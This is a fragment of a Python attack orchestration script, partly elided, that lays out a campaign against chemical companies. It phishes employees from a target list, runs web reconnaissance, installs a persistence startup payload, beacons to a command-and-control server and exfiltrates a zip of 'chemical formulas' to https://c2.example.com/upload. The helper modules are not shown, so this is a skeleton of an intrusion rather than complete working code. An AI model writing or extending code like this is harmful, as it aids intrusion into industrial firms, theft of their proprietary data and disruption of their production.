...
def main():
    """
    Main function to run the chemical_company_campaign campaign.
    """
    print(f"[*] Starting chemical_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("chemical_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target chemical_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/chemical_formulas_and_disrupting_production_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-CHEMICAL_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("chemical_formulas_and_disrupting_production/chemical_formulas_and_disrupting_production.zip", "https://c2.example.com/upload")
    run_tool("payloads/chemical_formulas_and_disrupting_production_exfiltrator.py")
